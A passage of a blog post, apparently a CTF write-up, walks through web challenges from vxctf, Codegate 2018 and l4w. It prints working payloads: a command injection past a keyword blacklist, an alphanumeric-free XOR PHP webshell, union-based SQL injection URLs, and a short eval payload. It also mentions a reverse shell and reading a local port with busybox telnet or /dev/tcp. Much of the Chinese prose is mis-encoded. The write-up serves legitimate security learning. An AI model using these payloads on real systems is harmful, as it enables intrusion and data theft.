class="string">'/ls|cat|tac|nl|more|less|head|tail|od|strings|base64|sort|pg|uniq|rev/'</span>,$v))&#123;<span class="keyword">exit</span>(<span class="string">"Blacklisted command found in input!"</span>);&#125;</div><div class="line">   chdir(<span class="string">"web-php"</span>);</div><div class="line">   @system(<span class="string">"diff current/index $v"</span>);</div></pre></td></tr></table></figure>
<p>å¯ä»¥æ˜é¡¯çœ‹åˆ°ï¼Œé€™è£¡å¯ä»¥Command Injection</p>
<p>åªæ˜¯ä»–æœ‰æ“‹æ‰ç‰¹æ®Šç¬¦è™Ÿå’Œä¸€äº›é—œéµå­—</p>
<p>è€Œæ›è¡Œé›–ç„¶æ²’æ“‹ï¼Œå¯æ˜¯json_decodeä¸åƒæ›è¡Œ</p>
<p>ä½†æ˜¯<code>json_decode</code>å¯ä»¥åƒ<code>\n</code>å’Œ<code>\t</code>ï¼Œä»–decodeæœƒè‡ªå‹•è½‰æˆæ›è¡Œ</p>
<p>ä¸èƒ½lsï¼Œå¯ä»¥é€™æ¨£åˆ—ç›®éŒ„: <code>{&quot;version&quot;:&quot;\necho\t*&quot;}</code></p>
<p>å†ä¾†å¯ä»¥ç™¼ç¾å­˜åœ¨é€™å€‹æª”æ¡ˆ: <code>/th1s_i5_4_l0n9_f0ld3r_n4me/7hi5_i5_a_s3cre7_fi13</code></p>
<p>ç›´æ¥è®€å‡ºä¾†å°±æ˜¯FLAG: <code>{&quot;version&quot;:&quot;/th*/7*&quot;}</code></p>
<p><code>vxctf{YezWiiWerBorn2MakeHistory}</code></p>
<h3 id="Patch_Peep_Huck__28w_29"><a href="#Patch_Peep_Huck__28w_29" class="headerlink" title="Patch Peep Huck (w)"></a>Patch Peep Huck (w)</h3><p>é€™é¡Œæ‡‰è©²æ˜¯é€™å ´Webæœ€æœ‰è¶£çš„ä¸€é¡ŒXD</p>
<p>å¾ˆå¹¸é‹çš„é€™é¡Œæˆ‘æ‹¿åˆ°é¦–æ®º</p>
<p>æœ€å¾Œä¹Ÿåªæœ‰å…©éšŠè§£å‡ºä¾†</p>
<p>é¡Œç›®é•·é€™æ¨£:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=!$I=&amp;$_FILES[!!$l=<span class="string">'tmp_name'</span>]||$I[<span class="string">'size'</span>]&gt;&gt;<span class="number">7</span>||preg_match(<span class="string">'/\w/'</span>,join(file($I[$l])))?!show_source(<span class="keyword">__FILE__</span>):!<span class="keyword">include</span>($I[$l]);</div></pre></td></tr></table></figure>
<p><code>!!$l=&#39;tmp_name&#39;</code>æœƒæŠŠ<code>$l</code>è¨­æˆ<code>&#39;tmp_name&#39;</code>ï¼Œä¸¦ä¸”å› ç‚º<code>NOT</code>é‹ç®—ï¼Œæœ€å¾Œæ•´å¥çµæœæ˜¯1</p>
<p>ä¹Ÿå°±æ˜¯<code>$_FILES[!!$l=&#39;tmp_name&#39;]</code>å¯¦éš›ä¸Šå°±æ˜¯å­˜å–<code>$_FILES[1]</code></p>
<p><code>$I[&#39;size&#39;]&gt;&gt;7</code>æ˜¯åˆ¤æ–·sizeä¸èƒ½è¶…éé€™å€‹å¤§å°ï¼Œå¦å‰‡é€™é‚Šæœƒè®ŠæˆTrueï¼Œå°±æ²’è¾¦æ³•includeæª”æ¡ˆäº†</p>
<p>é‡é»åœ¨æœ€å¾Œä¸€å€‹æ¢ä»¶: <code>preg_match(&#39;/\w/&#39;,join(file($I[$l])))</code></p>
<p>é€™é‚Šæ˜¯å–å‡ºæˆ‘å€‘ä¸Šå‚³çš„æª”æ¡ˆçš„å…§å®¹ï¼Œå¦‚æœè£¡é¢æœ‰å‡ºç¾è‹±æ•¸å­—æˆ–åº•ç·šï¼Œå°±ä¸çµ¦ä½ include</p>
<p>æ‰€ä»¥æˆ‘å€‘å°±æ˜¯æ§‹é€ å€‹ã€Œä¸ç”¨åˆ°è‹±æ•¸å­—å’Œåº•ç·šã€çš„webshell</p>
<p>æ–¹æ³•éå¸¸å¤šï¼Œæˆ‘é€™é‚Šæ˜¯ç”¨XORå»æ§‹é€ systemå­—ä¸²å’Œæˆ‘è¦åŸ·è¡Œçš„command</p>
<p>My Payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span>=</div><div class="line">$ğŸ’© = <span class="string">'[[[[@@'</span> ^ <span class="string">'("(/%-'</span>;</div><div class="line">$ğŸ’©((<span class="string">'@@['</span>^<span class="string">'#!/'</span>).<span class="string">" /????"</span>);</div></pre></td></tr></table></figure>
<p>ä»–å…¶å¯¦åœ¨åšçš„å°±æ˜¯<code>system(&quot;cat /????&quot;)</code></p>
<p><code>vxctf{Symb01icExecut10nCanPhuck}</code></p>
<h2 id="Codegate_2018_qual"><a href="#Codegate_2018_qual" class="headerlink" title="Codegate 2018 qual"></a>Codegate 2018 qual</h2><h3 id="SimpleCMS"><a href="#SimpleCMS" class="headerlink" title="SimpleCMS"></a>SimpleCMS</h3><p>é€™é¡Œæ˜¯Code Reviewé¡Œç›®</p>
<p>è »æ˜é¡¯æ„Ÿè¦ºå°±æ˜¯åœ¨è€ƒSQL Injection</p>
<p>ä½†æ“‹äº†ä¸€å †æ±è¥¿</p>
<p>å¯ä»¥ç™¼ç¾<code>col</code>åƒæ•¸æ²’æœ‰æ“‹<code>#</code>å’Œ<code>:</code></p>
<p>æ‰€ä»¥å¯ä»¥è¨»è§£æ‰å¾Œé¢æ•´å¥SQL</p>
<p>é‚£è¦æ€éº¼åˆ©ç”¨é€™å€‹é»å‘¢</p>
<p><code>search</code>åƒæ•¸å¯ä»¥å¡æ›è¡Œ(<code>%0a</code>)!!</p>
<p>æ›è¡Œä¹‹å¾Œå¯ä»¥ç¹¼çºŒæ¥SQLï¼Œé€™æ˜¯é€™é¡Œæœ€å¥½ç©çš„å°trick</p>
<p>é€éè¨»è§£+æ›è¡ŒæŠŠä¸­é–“ä¸€æ®µä¸æƒ³è¦çš„SQLè¨»è§£æ‰</p>
<p>å¾Œé¢å°±å¯ä»¥å»Union basedæ³¨å…¥æƒ¹</p>
<p>åªæ˜¯é€™é¡Œä»–æœ‰æ“‹<code>information.schema</code></p>
<p>æ²’è¾¦æ³•çŸ¥é“è¡¨åã€æ¬„ä½å</p>
<p>é€™è£¡å¯ä»¥ç”¨åˆ°å¦ä¸€å€‹å°trick</p>
<p>å› ç‚ºä»–çš„table engineæ˜¯<code>innodb</code></p>
<p>æˆ‘å€‘å¯ä»¥é€™æ¨£æ’ˆè¡¨åï¼š</p>
<p><code>/index.php?act=board&amp;mid=search&amp;type=2&amp;col=title|idx%23&amp;search=%0a)union+select+1,table_name,3,4,5 from mysql.innodb_table_stats limit 2,1--+</code></p>
<p>çˆ†flagä¹Ÿå¯ä»¥ä¸éœ€è¦Column nameå°±æ’ˆå‡ºä¾†:</p>
<p><code>/index.php?act=board&amp;mid=search&amp;type=2&amp;col=title|idx%23&amp;search=%0a)union+select+c,2,3,4,5 from (SELECT 1 a,2 b,3 c, 4 d UNION SELECT * FROM 41786c497656426a6149_flag)x limit 1,1--+</code></p>
<h2 id="l4w"><a href="#l4w" class="headerlink" title="l4w"></a>l4w</h2><p><a href="http://l4w.pw/%f0%9f%a4%94/" target="_blank" rel="external">http://l4w.pw/%f0%9f%a4%94/</a></p>
<p>é¡Œç›®:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"lul.css"</span>&gt; </div><div class="line">&lt;pre&gt;</div><div class="line">&lt;h3&gt;ğŸ”¥ Hall of Fame ğŸ”¥&lt;/h3&gt;</div><div class="line"><span class="meta">&lt;?</span>=file_get_contents(<span class="string">'hof.txt'</span>);<span class="meta">?&gt;</span></div><div class="line">&lt;hr&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Connect to localhost:8888 to get the flag</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'ğŸ‘‰ğŸ»'</span>] == <span class="string">'ğŸ‘ŒğŸ»'</span>) <span class="keyword">die</span>(phpinfo());</div><div class="line">$_ = $_GET[<span class="string">'â£'</span>];</div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="keyword">die</span>(<span class="string">'the game is over'</span>); <span class="comment">// this page will be removed soon.</span></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/[\w]&#123;4,&#125;/is"</span>,$_) || preg_match(<span class="string">"/\[|\"|'|\||\^|~|\./is"</span>,$_)) <span class="comment">// mÃ¬nh thÃ­ch thÃ¬ mÃ¬nh block hoy ğŸ‘¯</span></div><div class="line">     <span class="keyword">die</span>(<span class="string">"ğŸ™…"</span>); <span class="comment">// 4cm is too much</span></div><div class="line"><span class="keyword">eval</span>(substr($_,<span class="number">0</span>,<span class="number">30</span>));</div></pre></td></tr></table></figure>
<p>é€™æ˜¯æˆ‘éå¹´æ™‚åšçš„ä¸€é¡Œ</p>
<p>å¾ˆæœ‰è¶£çš„phpé¡Œ</p>
<p>è¶…æ„›é€™ç¨®çŸ­å°åˆå¾ˆåƒæŠ€å·§çš„é¡Œç›®XD</p>
<p>é€™é¡Œè§£æ³•å¾ˆå¤šï¼Œæ‰€ä»¥åšå®Œå¯ä»¥å­¸åˆ°å¾ˆå¤š</p>
<p>ä»–é™åˆ¶äº†å¾ˆå¤šï¼Œä¾‹å¦‚ä¸èƒ½å‡ºç¾é€£çºŒé•·åº¦4ä»¥ä¸Šçš„è‹±æ–‡æ•¸å­—åº•ç·šç­‰</p>
<p>ç„¶å¾Œé€éå»çš„payloadï¼Œä»–åªæœƒå–å‰30 Byteså»<code>eavl</code></p>
<p>æœ€å¾Œè¦å»è®€<code>localhost:8888</code>æ‰èƒ½æ‹¿åˆ°FLAG</p>
<p>æˆ‘è‡ªå·±ä¸€é–‹å§‹çš„æ–¹æ³•å°±è·Ÿvxctfé‚£é¡Œä¸€æ¨£ï¼Œç”¨xoræ§‹é€ system</p>
<p>ä½†å¤ªå®¹æ˜“è¶…éé•·åº¦30ï¼Œå°±æ”¾æ£„äº†</p>
<p>æˆ‘å¾Œä¾†çš„è§£æ³•æ˜¯: <code>?%E2%81%A3=`$_`;//;a=sle;b=ep;$a$b 10;</code></p>
<p><code>`$_`;//;</code>å¾Œé¢å¯ä»¥æ¥æŒ‡ä»¤</p>
<p>ç„¶å¾ŒæŠŠshell scriptç”¨é¡ä¼¼HITCON CTF 2017 Babyfirstçš„æŠ€å·§å¯«é€²<code>/tmp</code></p>
<p>å†æŠŠReverse shellå™´å›ä¾†</p>
<p>ä½†å™´å›ä¾†é‚„æœ‰å€‹å‘XD</p>
<p>ä»–æ²’æœ‰<code>nc</code>, <code>curl</code>, <code>wget</code>, <code>telnet</code>â€¦ç­‰æŒ‡ä»¤</p>
<p>è¦æ€éº¼å»è®€localhost:8888 ?</p>
<p>å¾Œä¾†æˆ‘ç™¼ç¾ä»–æœ‰<code>busybox</code>ï¼Œè£é ­æœ‰<code>telnet</code>å¯ä»¥ç”¨</p>
<p>æ‰€ä»¥<code>busybox telnet localhost 8888</code>å°±è®€å‡ºFLAGæƒ¹</p>
<p>å…¶ä»–äººé‚„æœ‰ç”¨<code>cat &lt; /dev/tcp/0/8888</code>æˆ–<code>ssh -v 0 8888</code>çš„</p>
<p>æ›´å¤šè§£æ³•å¯ä»¥çœ‹writeup: <a href="https://github.com/l4wio/CTF-challenges-by-me/tree/master/lixi_2018/writeup" target="_blank" rel="external">https://github.com/l4wio/CTF-challenges-by-me/tree/master/lixi_2018/writeup</a></p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/08/20/DEFCON-26-Final-CTFåˆé«”é©—/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          DEFCON 26 Final CTFåˆé«”é©—
        
      </div>
    </a>
  
  
    <a href="/2018/01/16/AIS3-EOF-2017-åˆè³½/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">AIS3 EOF CTF åˆè³½</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>


<div class="share_jia">
	<!-- JiaThis Button BEGIN -->
	<div class="jiathis_style">
		<span class="jiathis_txt">Share to: &nbsp; </span>
		<a class="jiathis_button_facebook"></a> 
    <a class="jiathis_button_twitter"></a>
    <a class="jiathis_button_plus"></a> 
    <a class="jiathis_button_tsina"></a>
		<a class="jiathis_button_cqq"></a>
		<a class="jiathis_button_douban"></a>
		<a class="jiathis_button_weixin"></a>
		<a class="jiathis_button_tumblr"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
	</div>
	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
	<!-- JiaThis Button END -->
</div>








<section id="comments">
  <div id="disqus_thread"></div>
    <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>

</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2019 KaiBro
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-61797645-2', 'auto');
  ga('send', 'pageview');

</script>



<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>



  </div>
</body>
</html>